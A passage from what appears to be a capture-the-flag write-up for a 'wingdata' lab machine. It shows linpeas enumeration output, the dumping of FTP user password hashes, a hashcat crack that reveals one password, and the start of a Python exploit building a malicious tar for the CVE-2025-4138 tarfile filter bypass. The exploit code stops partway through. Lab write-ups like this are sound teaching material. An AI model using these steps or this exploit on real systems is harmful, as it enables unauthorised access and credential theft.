/opt/wftpserver/webadmin/language/french.html
/opt/wftpserver/webadmin/language/german.html
/opt/wftpserver/webadmin/language.html
/opt/wftpserver/webadmin/language/italian.html
/opt/wftpserver/webadmin/language/japanese.html
/opt/wftpserver/webadmin/language/korean.html
/opt/wftpserver/webadmin/language/polish.html
/opt/wftpserver/webadmin/language/portuguese.html
#)You_can_write_even_more_files_inside_last_directory

/opt/wftpserver/webadmin/main.html
/opt/wftpserver/webadmin/run.lua
/opt/wftpserver/webadmin/webfonts
/opt/wftpserver/webadmin/webfonts/fa-brands-400.eot
/opt/wftpserver/webadmin/webfonts/fa-brands-400.ttf
/opt/wftpserver/webadmin/webfonts/fa-brands-400.woff
/opt/wftpserver/webadmin/webfonts/fa-brands-400.woff2
/opt/wftpserver/webadmin/webfonts/fa-regular-400.eot
#)You_can_write_even_more_files_inside_last_directory

/opt/wftpserver/webclient
/opt/wftpserver/webclient/audioplayer.html
/opt/wftpserver/webclient/bookmark.html
/opt/wftpserver/webclient/changepass.html
/opt/wftpserver/webclient/chdir.html
/opt/wftpserver/webclient/checkcode.html
#)You_can_write_even_more_files_inside_last_directory

/opt/wftpserver/webclient/css/allfonts.min.css
/opt/wftpserver/webclient/css/bulma.min.css
/opt/wftpserver/webclient/css/style.css
/opt/wftpserver/webclient/cut.html
/opt/wftpserver/webclient/dir.html
/opt/wftpserver/webclient/downloadfolder.html
/opt/wftpserver/webclient/downloadpass.html
/opt/wftpserver/webclient/ed2kurl.html
#)You_can_write_even_more_files_inside_last_directory

/opt/wftpserver/webclient/edit_area/autocompletion.js
/opt/wftpserver/webclient/edit_area/edit_area.css
/opt/wftpserver/webclient/edit_area/edit_area_full.js
/opt/wftpserver/webclient/edit_area/edit_area_functions.js
/opt/wftpserver/webclient/edit_area/edit_area.js
#)You_can_write_even_more_files_inside_last_directory

/opt/wftpserver/webclient/edit_area/langs/big5.js
/opt/wftpserver/webclient/edit_area/langs/ch.js
/opt/wftpserver/webclient/edit_area/langs/cs.js
/opt/wftpserver/webclient/edit_area/langs/de.js
/opt/wftpserver/webclient/edit_area/langs/dk.js
#)You_can_write_even_more_files_inside_last_directory

/opt/wftpserver/webclient/edit_area/manage_area.js
/opt/wftpserver/webclient/edit_area/regexp.js
/opt/wftpserver/webclient/edit_area/reg_syntax
/opt/wftpserver/webclient/edit_area/reg_syntax/c.js
/opt/wftpserver/webclient/edit_area/reg_syntax/cpp.js
/opt/wftpserver/webclient/edit_area/reg_syntax/cs.js
/opt/wftpserver/webclient/edit_area/reg_syntax/css.js
/opt/wftpserver/webclient/edit_area/reg_syntax/go.js
#)You_can_write_even_more_files_inside_last_directory

/opt/wftpserver/webclient/edit_area/reg_syntax.js
/opt/wftpserver/webclient/edit_area/reg_syntax/js.js
/opt/wftpserver/webclient/edit_area/reg_syntax/lua.js
/opt/wftpserver/webclient/edit_area/reg_syntax/pas.js
/opt/wftpserver/webclient/edit_area/reg_syntax/perl.js
/opt/wftpserver/webclient/edit_area/reg_syntax/php.js
#)You_can_write_even_more_files_inside_last_directory

/opt/wftpserver/webclient/edit_area/resize_area.js
/opt/wftpserver/webclient/edit_area/search_replace.js

╔══════════╣ Interesting GROUP writable files (not in Home) (max 200) (T1574.009,T1574.010)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-files
  Group wingftp:
/opt/wftpserver/Data/1/users/maria.xml
/opt/wftpserver/Data/1/users/steve.xml
/opt/wftpserver/Data/1/users/wacky.xml
/opt/wftpserver/Data/ssh_host_key
/opt/wftpserver/Log/Admin/Admin-2026-5-8.log
/opt/wftpserver/Log/Admin/Admin-2026-1-12.log
/opt/wftpserver/Log/Admin/Admin-2026-1-14.log
/opt/wftpserver/Log/Admin/Admin-2026-2-9.log
/opt/wftpserver/Log/Admin/Admin-2026-1-22.log
#)You_can_write_even_more_files_inside_last_directory

/opt/wftpserver/Log/Domains/1/2026-5-8.log
/opt/wftpserver/Log/Domains/1/2026-2-9.log.zip
/opt/wftpserver/Log/System/System-2026-2-9.log
/opt/wftpserver/Log/System/System-2026-5-8.log
/tmp/linpeas.sh
/tmp/nmap

╔══════════╣ Writable root-owned executables I can modify (max 200) (T1574.009,T1574.010)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-files
Writable root-owned executables Not Found

                            ╔═════════════════════════╗
════════════════════════════╣ Other Interesting Files ╠════════════════════════════
                            ╚═════════════════════════╝
╔══════════╣ .sh files in path (T1574.007)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#scriptbinaries-in-path
/usr/bin/gettext.sh

╔══════════╣ Executable files potentially added by user (limit 70) (T1083)
2026-05-08+04:50:39.8999927510 /opt/wftpserver/Data/1/users/anonymous.xml
2026-05-08+04:50:03.7999935890 /opt/wftpserver/Log/audit_db
2026-05-08+04:45:38.8079997370 /opt/wftpserver/Data/_ADMINISTRATOR/admins.xml
2026-01-22+04:41:51.7071699300 /usr/local/sbin/laurel
2026-01-08+09:28:54.0999949510 /etc/X11/Xsession.d/99-vmware_vmware-user
2026-01-08+09:28:48.4039950830 /usr/sbin/mount.vmhgfs
2026-01-08+09:28:48.1679950880 /etc/vmware-tools/vgauth.conf
2026-01-08+09:28:48.1639950880 /usr/lib/vmware-tools/bin32/vmware-xferlogs
2026-01-08+09:28:48.1639950880 /usr/lib/vmware-tools/bin32/appLoader
2026-01-08+09:28:48.1599950890 /usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
2026-01-08+09:28:48.1599950890 /usr/lib/vmware-tools/bin32/configure-gtk.sh
2026-01-08+09:28:48.1599950890 /usr/lib/vmware-tools/bin32/appLoader-av0
2026-01-08+09:28:48.0239950920 /usr/lib/vmware-tools/plugins32/vmsvc/libvmbackup.so
2026-01-08+09:28:48.0239950920 /usr/lib/vmware-tools/plugins32/vmsvc/libtimeSync.so
2026-01-08+09:28:48.0239950920 /usr/lib/vmware-tools/plugins32/vmsvc/libresolutionKMS.so
2026-01-08+09:28:48.0239950920 /usr/lib/vmware-tools/plugins32/vmsvc/libpowerOps.so
2026-01-08+09:28:48.0239950920 /usr/lib/vmware-tools/plugins32/vmsvc/libguestInfo.so
2026-01-08+09:28:48.0239950920 /usr/lib/vmware-tools/plugins32/vmsvc/libdeployPkgPlugin.so
2026-01-08+09:28:48.0239950920 /usr/lib/vmware-tools/plugins32/vmsvc/libautoUpgrade.so
2026-01-08+09:28:48.0199950920 /usr/lib/vmware-tools/plugins32/vmusr/libresolutionSet.so
2026-01-08+09:28:48.0199950920 /usr/lib/vmware-tools/plugins32/vmusr/libdndcp.so
2026-01-08+09:28:48.0199950920 /usr/lib/vmware-tools/plugins32/vmusr/libdesktopEvents.so
2026-01-08+09:28:48.0199950920 /usr/lib/vmware-tools/plugins32/common/libvix.so
2026-01-08+09:28:48.0199950920 /usr/lib/vmware-tools/plugins32/common/libhgfsServer.so
2026-01-08+09:28:47.6439951010 /usr/lib/vmware-tools/sbin64/vmtoolsd
2026-01-08+09:28:47.6439951010 /usr/lib/vmware-tools/sbin32/vmware-rpctool
2026-01-08+09:28:47.6439951010 /usr/lib/vmware-tools/sbin32/vmware-hgfsmounter
2026-01-08+09:28:47.6439951010 /usr/lib/vmware-tools/sbin32/vmware-checkvm
2026-01-08+09:28:47.6439951010 /usr/lib/vmware-tools/bin64/vmware-xferlogs
2026-01-08+09:28:47.6439951010 /usr/lib/vmware-tools/bin64/configure-gtk.sh
2026-01-08+09:28:47.6439951010 /usr/lib/vmware-tools/bin64/appLoader-av0
2026-01-08+09:28:47.6439951010 /usr/lib/vmware-tools/bin64/appLoader
2026-01-08+09:28:47.6399951010 /usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
2026-01-08+09:28:47.6359951010 /usr/lib/vmware-tools/configurator/XOrg/7.6/vmmouse_detect
2026-01-08+09:28:47.6279951010 /usr/lib/vmware-tools/sbin64/vmware-rpctool
2026-01-08+09:28:47.6279951010 /usr/lib/vmware-tools/sbin64/vmware-hgfsmounter
2026-01-08+09:28:47.6279951010 /usr/lib/vmware-tools/sbin64/vmware-checkvm
2026-01-08+09:28:47.6279951010 /usr/lib/vmware-tools/configurator/XOrg/7.6_64/vmmouse_detect
2026-01-08+09:28:47.1719951110 /usr/bin/vmware-config-tools.pl
2026-01-08+09:28:47.1719951110 /etc/init.d/vmware-tools
2026-01-08+09:28:47.1639951120 /usr/bin/vmware-uninstall-tools.pl
2026-01-08+09:28:47.1639951120 /usr/bin/vm-support
2026-01-08+09:28:47.1519951120 /etc/vmware-tools/messages/de/VGAuthService.vmsg
2026-01-08+09:28:47.1479951120 /etc/vmware-tools/messages/ko/vmtoolsd.vmsg
2026-01-08+09:28:47.1479951120 /etc/vmware-tools/messages/ko/VGAuthService.vmsg
2026-01-08+09:28:47.1479951120 /etc/vmware-tools/messages/ko/VGAuthLib.vmsg
2026-01-08+09:28:47.1479951120 /etc/vmware-tools/messages/ko/VGAuthCli.vmsg
2026-01-08+09:28:47.1479951120 /etc/vmware-tools/messages/ko/toolboxcmd.vmsg
2026-01-08+09:28:47.1479951120 /etc/vmware-tools/messages/ko/hgfsUsability.vmsg
2026-01-08+09:28:47.1479951120 /etc/vmware-tools/messages/ko/desktopEvents.vmsg
2026-01-08+09:28:47.1479951120 /etc/vmware-tools/messages/ja/vmtoolsd.vmsg
2026-01-08+09:28:47.1479951120 /etc/vmware-tools/messages/ja/VGAuthService.vmsg
2026-01-08+09:28:47.1479951120 /etc/vmware-tools/messages/ja/VGAuthLib.vmsg
2026-01-08+09:28:47.1479951120 /etc/vmware-tools/messages/ja/VGAuthCli.vmsg
2026-01-08+09:28:47.1479951120 /etc/vmware-tools/messages/ja/toolboxcmd.vmsg
2026-01-08+09:28:47.1479951120 /etc/vmware-tools/messages/ja/hgfsUsability.vmsg
2026-01-08+09:28:47.1479951120 /etc/vmware-tools/messages/ja/desktopEvents.vmsg
2026-01-08+09:28:47.1479951120 /etc/vmware-tools/messages/es/vmtoolsd.vmsg
2026-01-08+09:28:47.1479951120 /etc/vmware-tools/messages/es/VGAuthService.vmsg
2026-01-08+09:28:47.1479951120 /etc/vmware-tools/messages/es/VGAuthLib.vmsg
2026-01-08+09:28:47.1479951120 /etc/vmware-tools/messages/es/VGAuthCli.vmsg
2026-01-08+09:28:47.1479951120 /etc/vmware-tools/messages/es/toolboxcmd.vmsg
2026-01-08+09:28:47.1479951120 /etc/vmware-tools/messages/es/hgfsUsability.vmsg
2026-01-08+09:28:47.1479951120 /etc/vmware-tools/messages/es/desktopEvents.vmsg
2026-01-08+09:28:47.1479951120 /etc/vmware-tools/messages/en/vmtoolsd.vmsg
2026-01-08+09:28:47.1479951120 /etc/vmware-tools/messages/en/VGAuthService.vmsg
2026-01-08+09:28:47.1479951120 /etc/vmware-tools/messages/en/VGAuthLib.vmsg
2026-01-08+09:28:47.1479951120 /etc/vmware-tools/messages/en/VGAuthCli.vmsg
2026-01-08+09:28:47.1479951120 /etc/vmware-tools/messages/en/toolboxcmd.vmsg
2026-01-08+09:28:47.1479951120 /etc/vmware-tools/messages/en/hgfsUsability.vmsg
sort: fflush failed: 'standard output': Broken pipe
sort: write error

╔══════════╣ Unexpected in /opt (usually empty) (T1083)
total 16
drwxr-xr-x  4 root    root    4096 Feb  9 08:19 .
drwxr-xr-x 18 root    root    4096 Feb  9 08:19 ..
drwxr-x---  4 root    wacky   4096 Jan 12 08:43 backup_clients
drwxr-x---  9 wingftp wingftp 4096 May  8 04:45 wftpserver

╔══════════╣ Unexpected in root (T1083)
/vmlinuz
/initrd.img.old
/vmlinuz.old
/initrd.img

╔══════════╣ Modified interesting files in the last 5mins (limit 100) (T1083)
/var/log/laurel/audit.log
/var/log/laurel/audit.log.2
/var/log/laurel/audit.log.3
/var/log/laurel/audit.log.1
/var/log/journal/d7191fe43d42493b8eff7c566ecfc9a6/user-1000.journal
/var/log/journal/d7191fe43d42493b8eff7c566ecfc9a6/system.journal
/var/log/journal/d7191fe43d42493b8eff7c566ecfc9a6/system@f26bda7fbd3946588321c961f012fe1b-00000000000765e8-0006514a6b73b5f9.journal
/var/log/journal/d7191fe43d42493b8eff7c566ecfc9a6/user-1000@55faae5bf9b142eea2bbfe28a233bf98-000000000007f581-0006514a9c835d75.journal

╔══════════╣ Syslog configuration (limit 50) (T1070.002)
syslog configuration Not Found
╔══════════╣ Auditd configuration (limit 50) (T1070.002)
auditd configuration Not Found
╔══════════╣ Log files with potentially weak perms (limit 50) (T1070.002)
    21316   4888 -rw-------   1 _laurel  _laurel   5001246 Jan 22 05:12 /var/log/laurel/audit.log.28
     2369   3384 -rw-------   1 _laurel  _laurel   3464718 May  8 05:17 /var/log/laurel/audit.log
    21556   4884 -rw-------   1 _laurel  _laurel   5000017 Feb  9 05:14 /var/log/laurel/audit.log.14
    58257   4884 -rw-------   1 _laurel  _laurel   5000030 Feb  9 09:37 /var/log/laurel/audit.log.12
    21559   4884 -rw-------   1 _laurel  _laurel   5000125 Jan 22 05:12 /var/log/laurel/audit.log.27
    21561   4888 -rw-------   1 _laurel  _laurel   5001396 Jan 22 05:13 /var/log/laurel/audit.log.26
    21560   4884 -rw-------   1 _laurel  _laurel   5000044 Jan 22 05:13 /var/log/laurel/audit.log.22
    21562   4884 -rw-------   1 _laurel  _laurel   5000963 Jan 22 05:14 /var/log/laurel/audit.log.21
    58263   4884 -rw-------   1 _laurel  _laurel   5001091 Feb  9 09:37 /var/log/laurel/audit.log.9
    58264   4884 -rw-------   1 _laurel  _laurel   5000710 May  8 04:45 /var/log/laurel/audit.log.8
    19322   4884 -rw-------   1 _laurel  _laurel   5000929 Feb  9 05:02 /var/log/laurel/audit.log.19
    21549   4884 -rw-------   1 _laurel  _laurel   5000761 Feb  9 05:14 /var/log/laurel/audit.log.17
    58281   4888 -rw-------   1 _laurel  _laurel   5001297 May  8 05:05 /var/log/laurel/audit.log.5
     2340   4884 -rw-------   1 _laurel  _laurel   5000119 May  8 05:13 /var/log/laurel/audit.log.2
     2334   4888 -rw-------   1 _laurel  _laurel   5001597 May  8 05:12 /var/log/laurel/audit.log.3
     2360   4888 -rw-------   1 _laurel  _laurel   5001416 May  8 05:16 /var/log/laurel/audit.log.1
    58261   4888 -rw-------   1 _laurel  _laurel   5001319 Feb  9 09:37 /var/log/laurel/audit.log.11
    58259   4884 -rw-------   1 _laurel  _laurel   5000285 May  8 04:59 /var/log/laurel/audit.log.7
    58262   4884 -rw-------   1 _laurel  _laurel   5001163 Feb  9 09:37 /var/log/laurel/audit.log.10
    21352   4884 -rw-------   1 _laurel  _laurel   5000454 Jan 22 05:13 /var/log/laurel/audit.log.23
     7874   4888 -rw-------   1 _laurel  _laurel   5001492 May  8 04:59 /var/log/laurel/audit.log.6
      117   4884 -rw-------   1 _laurel  _laurel   5000595 May  8 05:05 /var/log/laurel/audit.log.4
    21555   4888 -rw-------   1 _laurel  _laurel   5001414 Feb  9 05:14 /var/log/laurel/audit.log.15
    21515   4884 -rw-------   1 _laurel  _laurel   5000717 Feb  9 05:14 /var/log/laurel/audit.log.18
    16587   4884 -rw-------   1 _laurel  _laurel   5000796 Jan 22 05:12 /var/log/laurel/audit.log.29
    21553   4884 -rw-------   1 _laurel  _laurel   5000774 Feb  9 05:14 /var/log/laurel/audit.log.16
    21557   4884 -rw-------   1 _laurel  _laurel   5000516 Feb  9 09:37 /var/log/laurel/audit.log.13
    21119   4884 -rw-------   1 _laurel  _laurel   5000769 Jan 22 05:13 /var/log/laurel/audit.log.24
    21563   4884 -rw-------   1 _laurel  _laurel   5000725 Jan 22 05:13 /var/log/laurel/audit.log.25
    21564   4884 -rw-------   1 _laurel  _laurel   5000261 Jan 22 05:16 /var/log/laurel/audit.log.20
    58267      4 -rw-r-----   1 root     adm           847 Feb  9 05:14 /var/log/apt/term.log.1.gz
    58266      0 -rw-r-----   1 root     adm             0 May  8 04:45 /var/log/apt/term.log

╔══════════╣ Files inside /opt/wingftp (limit 20) (T1083)

╔══════════╣ Files inside others home (limit 20) (T1552.001)
/var/www/wingdata.htb/index.html
/var/www/wingdata.htb/vendor/bootstrap/js/bootstrap.bundle.min.js.map
/var/www/wingdata.htb/vendor/bootstrap/js/bootstrap.bundle.min.js
/var/www/wingdata.htb/vendor/bootstrap/js/bootstrap.min.js
/var/www/wingdata.htb/vendor/bootstrap/css/bootstrap.min.css
/var/www/wingdata.htb/vendor/bootstrap/css/bootstrap.min.css.map
/var/www/wingdata.htb/vendor/jquery/jquery.slim.min.map
/var/www/wingdata.htb/vendor/jquery/jquery.js
/var/www/wingdata.htb/vendor/jquery/jquery.slim.min.js
/var/www/wingdata.htb/vendor/jquery/jquery.min.map
/var/www/wingdata.htb/vendor/jquery/jquery.slim.js
/var/www/wingdata.htb/vendor/jquery/jquery.min.js
/var/www/wingdata.htb/assets/js/imagesloaded.js
/var/www/wingdata.htb/assets/js/isotope.js
/var/www/wingdata.htb/assets/js/templatemo-custom.js
/var/www/wingdata.htb/assets/js/owl-carousel.js
/var/www/wingdata.htb/assets/js/animation.js
/var/www/wingdata.htb/assets/js/tabs.js
/var/www/wingdata.htb/assets/fonts/slick.svg
/var/www/wingdata.htb/assets/fonts/slick.ttf

╔══════════╣ Searching installed mail applications (T1114.001)

╔══════════╣ Mails (limit 50) (T1114.001)

╔══════════╣ Backup folders (T1552.001)
drwxr-xr-x 3 root root 4096 May  8 04:52 /var/backups
total 36
-rw-r--r-- 1 root root 13890 Feb  9 05:14 apt.extended_states.0
-rw-r--r-- 1 root root  1590 Jan 22 04:41 apt.extended_states.1.gz
-rw-r--r-- 1 root root  1576 Nov  3  2025 apt.extended_states.2.gz
-rw-r--r-- 1 root root  1201 Nov  2  2025 apt.extended_states.3.gz
-rw-r--r-- 1 root root  1159 Nov  2  2025 apt.extended_states.4.gz
drwxr-xr-x 2 root root  4096 Feb  9 08:19 hygiene

╔══════════╣ Backup files (limited 100) (T1552.001)
-rwxr-xr-x 1 root root 2569 May 10  2023 /usr/libexec/dpkg/dpkg-db-backup
-rw-r--r-- 1 root root 13581 Nov  3  2025 /usr/local/lib/python3.12/test/test_sqlite3/__pycache__/test_backup.cpython-312.opt-1.pyc
-rw-r--r-- 1 root root 13581 Nov  3  2025 /usr/local/lib/python3.12/test/test_sqlite3/__pycache__/test_backup.cpython-312.pyc
-rw-r--r-- 1 root root 13581 Nov  3  2025 /usr/local/lib/python3.12/test/test_sqlite3/__pycache__/test_backup.cpython-312.opt-2.pyc
-rw-r--r-- 1 root root 5767 Nov  3  2025 /usr/local/lib/python3.12/test/test_sqlite3/test_backup.py
-rw-r--r-- 1 root root 194817 Oct  9  2020 /usr/share/doc/x11-common/changelog.Debian.old.gz
-rw-r--r-- 1 root root 438702 Feb 15  2023 /usr/share/doc/manpages/Changes.old.gz
-rw-r--r-- 1 root root 147 Mar 26  2023 /usr/lib/systemd/system/dpkg-db-backup.service
-rw-r--r-- 1 root root 138 Mar 26  2023 /usr/lib/systemd/system/dpkg-db-backup.timer
-rw-r--r-- 1 root root 14257 Dec 30 17:20 /usr/lib/modules/6.1.0-42-amd64/kernel/drivers/net/team/team_mode_activebackup.ko
-rwxr-xr-x 1 root root 38984 Jan  8 09:28 /usr/lib/vmware-tools/plugins64/vmsvc/libvmbackup.so
-rwxr-xr-x 1 root root 34176 Jan  8 09:28 /usr/lib/vmware-tools/plugins32/vmsvc/libvmbackup.so
-rw-r--r-- 1 root root 0 Nov  2  2025 /var/lib/systemd/deb-systemd-helper-enabled/timers.target.wants/dpkg-db-backup.timer
-rw-r--r-- 1 root root 61 Nov  2  2025 /var/lib/systemd/deb-systemd-helper-enabled/dpkg-db-backup.timer.dsh-also

╔══════════╣ Searching tables inside readable .db/.sql/.sqlite files (limit 100) (T1005)
Found /var/lib/apt/listchanges.db: Berkeley DB (Hash, version 9, native byte-order)

╔══════════╣ Web files?(output limit) (T1005)
/var/www/:
total 16K
drwxr-xr-x  4 root     root     4.0K Feb  9 08:19 .
drwxr-xr-x 12 root     root     4.0K Feb  9 08:19 ..
drwxr-xr-x  2 root     root     4.0K Feb  9 08:19 html
drwxr-xr-x  4 www-data www-data 4.0K Feb  9 08:19 wingdata.htb

/var/www/html:
total 8.0K
drwxr-xr-x 2 root root 4.0K Feb  9 08:19 .

╔══════════╣ All relevant hidden files (not in /sys/ or the ones listed in the previous check) (limit 70) (T1564.001)
-rw-r--r-- 1 root root 0 May  8 04:45 /run/network/.ifstate.lock
-rw-r--r-- 1 root root 220 Jun  6  2025 /etc/skel/.bash_logout
-rw------- 1 root root 0 Nov  2  2025 /etc/.pwd.lock
-rw-r--r-- 1 root root 0 Mar 14  2023 /usr/share/dictionaries-common/site-elisp/.nosearch

╔══════════╣ Readable files inside /tmp, /var/tmp, /private/tmp, /private/var/at/tmp, /private/var/tmp, and backup folders (limit 70) (T1552.001)
-rwxrwxrwx 1 wingftp wingftp 1005683 Mar  8 11:27 /tmp/linpeas.sh
-rwxrwxrwx 1 wingftp wingftp 5944464 May  8 05:04 /tmp/nmap

╔══════════╣ Searching passwords in history files (T1552.001)
/usr/local/lib/python3.12/idlelib/idle_test/test_history.py:    @classmethod
/usr/local/lib/python3.12/idlelib/idle_test/test_history.py:    @classmethod
/usr/local/lib/python3.12/idlelib/idle_test/test_history.py:        cls.root = tk.Tk()
/usr/local/lib/python3.12/idlelib/idle_test/test_history.py:        cls.root.withdraw()
/usr/local/lib/python3.12/idlelib/idle_test/test_history.py:        self.text = text = TextWrapper(self.root)
/usr/local/lib/python3.12/idlelib/idle_test/test_history.py:    @classmethod
/usr/local/lib/python3.12/idlelib/idle_test/test_history.py:        cls.root.destroy()
/usr/local/lib/python3.12/idlelib/idle_test/test_history.py:        del cls.root

╔══════════╣ Searching *password* or *credential* files in home (limit 70) (T1552.001)
/etc/pam.d/common-password
/opt/wftpserver/webadmin/images/password.gif
/opt/wftpserver/webclient/images/password.gif
/opt/wftpserver/webclient/images/password.png
/opt/wftpserver/wftp_default_ssh.key
/opt/wftpserver/wftp_default_ssl.key
/usr/bin/systemd-ask-password
/usr/bin/systemd-tty-ask-password-agent
/usr/lib/grub/i386-pc/legacy_password_test.mod
/usr/lib/grub/i386-pc/password.mod
/usr/lib/grub/i386-pc/password_pbkdf2.mod
/usr/lib/systemd/systemd-reply-password
/usr/lib/systemd/system/multi-user.target.wants/systemd-ask-password-wall.path
/usr/lib/systemd/system/sysinit.target.wants/systemd-ask-password-console.path
/usr/lib/systemd/system/systemd-ask-password-console.path
/usr/lib/systemd/system/systemd-ask-password-console.service
/usr/lib/systemd/system/systemd-ask-password-wall.path
/usr/lib/systemd/system/systemd-ask-password-wall.service
  #)There are more creds/passwds files in the previous parent folder

/usr/share/doc/apache2-doc/manual/de/misc/password_encryptions.html
/usr/share/doc/apache2-doc/manual/en/misc/password_encryptions.html
/usr/share/doc/apache2-doc/manual/es/misc/password_encryptions.html
/usr/share/doc/apache2-doc/manual/fr/misc/password_encryptions.html
/usr/share/doc/apache2-doc/manual/ja/misc/password_encryptions.html
/usr/share/doc/apache2-doc/manual/ko/misc/password_encryptions.html
/usr/share/doc/apache2-doc/manual/pt-br/misc/password_encryptions.html
/usr/share/doc/apache2-doc/manual/ru/misc/password_encryptions.html
/usr/share/doc/apache2-doc/manual/tr/misc/password_encryptions.html
/usr/share/doc/apache2-doc/manual/zh-cn/misc/password_encryptions.html
/usr/share/man/man1/systemd-ask-password.1.gz
/usr/share/man/man1/systemd-tty-ask-password-agent.1.gz
/usr/share/man/man7/credentials.7.gz
/usr/share/man/man7/systemd.system-credentials.7.gz
/usr/share/man/man8/systemd-ask-password-console.path.8.gz
/usr/share/man/man8/systemd-ask-password-console.service.8.gz
/usr/share/man/man8/systemd-ask-password-wall.path.8.gz
/usr/share/man/man8/systemd-ask-password-wall.service.8.gz
  #)There are more creds/passwds files in the previous parent folder

/usr/share/pam/common-password.md5sums
/var/cache/debconf/passwords.dat
/var/lib/pam/password

╔══════════╣ Checking for TTY (sudo/su) passwords in audit logs (T1552.001)

╔══════════╣ Checking for TTY (sudo/su) passwords in audit logs (T1083)

╔══════════╣ Searching passwords inside logs (limit 70) (T1552.001)

╔══════════╣ Checking all env variables in /proc/*/environ removing duplicates and filtering out useless env vars (T1552.007,T1082)
HOME=/opt/wingftp
LANG=en_US.UTF-8
_=./linpeas.sh
LOGNAME=wingftp
OLDPWD=/home
OLDPWD=/opt/wftpserver/Data
PIDFILE=/opt/wftpserver/pid-wftpserver.pid
PWD=/opt/wftpserver
PWD=/tmp
SHELL=/bin/bash
SHLVL=1
SHLVL=2
TERM=xterm
USER=wingftp
_=/usr/bin/dd
_=/usr/bin/grep

                                ╔════════════════╗
════════════════════════════════╣ API Keys Regex ╠════════════════════════════════
                                ╚════════════════╝
Regexes to search for API keys aren't activated, use param '-r'
```

## Getting User Data

```bash
wingftp@wingdata:/var/www/wingdata.htb$ for f in /opt/wftpserver/Data/1/users/*.xml; do echo "=== $f ==="; grep -E "UserName|Password" $f; done
=== /opt/wftpserver/Data/1/users/anonymous.xml ===
        <UserName>anonymous</UserName>
        <EnablePassword>0</EnablePassword>
        <Password>d67f86152e5c4df1b0ac4a18d3ca4a89c1b12e6b748ed71d01aeb92341927bca</Password>
        <PasswordLength>0</PasswordLength>
        <CanChangePassword>0</CanChangePassword>
=== /opt/wftpserver/Data/1/users/john.xml ===
        <UserName>john</UserName>
        <EnablePassword>1</EnablePassword>
        <Password>c1f14672feec3bba27231048271fcdcddeb9d75ef79f6889139aa78c9d398f10</Password>
        <PasswordLength>0</PasswordLength>
        <CanChangePassword>0</CanChangePassword>
=== /opt/wftpserver/Data/1/users/maria.xml ===
        <UserName>maria</UserName>
        <EnablePassword>1</EnablePassword>
        <Password>a70221f33a51dca76dfd46c17ab17116a97823caf40aeecfbc611cae47421b03</Password>
        <PasswordLength>0</PasswordLength>
        <CanChangePassword>0</CanChangePassword>
=== /opt/wftpserver/Data/1/users/steve.xml ===
        <UserName>steve</UserName>
        <EnablePassword>1</EnablePassword>
        <Password>5916c7481fa2f20bd86f4bdb900f0342359ec19a77b7e3ae118f3b5d0d3334ca</Password>
        <PasswordLength>0</PasswordLength>
        <CanChangePassword>0</CanChangePassword>
=== /opt/wftpserver/Data/1/users/wacky.xml ===
        <UserName>wacky</UserName>
        <EnablePassword>1</EnablePassword>
        <Password>21821604314c59670868e2b6abf71c5483c23ff209e65ab4ccf86db1f3792c5e</Password>
        <PasswordLength>0</PasswordLength>
        <CanChangePassword>0</CanChangePassword>
wingftp@wingdata:/var/www/wingdata.htb$
```

## cracking hash

```bash
┌──[kali@Shieldbyte53]─[~/Downloads]
└─❯ hashcat -m 1410 hash.txt /usr/share/wordlists/rockyou.txt
hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-haswell-AMD Ryzen 3 7320U with Radeon Graphics, 1331/2662 MB (512 MB allocatable), 8MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
Minimum salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashes: 4 digests; 4 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Iterated
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory allocated for this attack: 514 MB (1919 MB free)

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP:pyth
```

```bash
#!/usr/bin/env python3
"""
CVE-2025-4138 / CVE-2025-4517 — Python tarfile PATH_MAX Filter Bypass
"""

import tarfile
import io
import os
import sys
import argparse

# Constants for Linux
DIR_COMP_LEN = 247
CHAIN_STEPS = "abcdefghijklmnop"  # 16 levels
LONG_LINK_LEN = 254

def build_exploit_tar(tar_path, target_file, payload, file_mode=0o644):
    """
    Build a malicious TAR file for CVE-2025-4138
    """
    comp = "d" * DIR_COMP_LEN
    inner_path = ""
    
    with tarfile.open(tar_path, "w") as tar:
        # Stage 1: Chain of symlinks
        for step_char in CHAIN_STEPS:
            # Long directory
            d = tarfile.TarInfo(name=os.path.join(inner_path, comp))
            d.type = tarfile.DIRTYPE
            tar.addfile(d)
            
            # Short symlink → long directory
            s = tarfile.TarInfo(name=os.path.join(inner_path, step_char))
            s.type = tarfile.SYMTYPE
            s.linkname = comp
            tar.addfile(s)
            
            inner_path = os.path.join(inner_path, comp)
        
        # Stage 2: Pivot symlink (exceed PATH_MAX)
        short_chain = "/".join(CHAIN_STEPS)
        link_name = os.path.join(short_chain, "l" * LONG_LINK_LEN)
        
        pivot = tarfile.TarInfo(name=link_name)
        pivot.type = tarfile.SYMTYPE
        pivot.linkname = "../" * len(CHAIN_STEPS)
        tar.addfile(pivot)
        
        # Stage 3: Escape symlink
        target_dir = os.path.dirname(target_file)
        target_basename = os.path.basename(target_file)
        
        depth = 8
        escape_linkname = (
            link_name + "/" + ("../" * depth) + target_dir.lstrip("/")
        )
        
        esc = tarfile.TarInfo(name="escape")
        esc.type = tarfile.SYMTYPE
        esc.linkname = escape_linkname
        tar.addfile(esc)
        
        # Stage 4: Write payload
        payload_entry = tarfile.TarInfo(name=f"escape/{target_basename}")
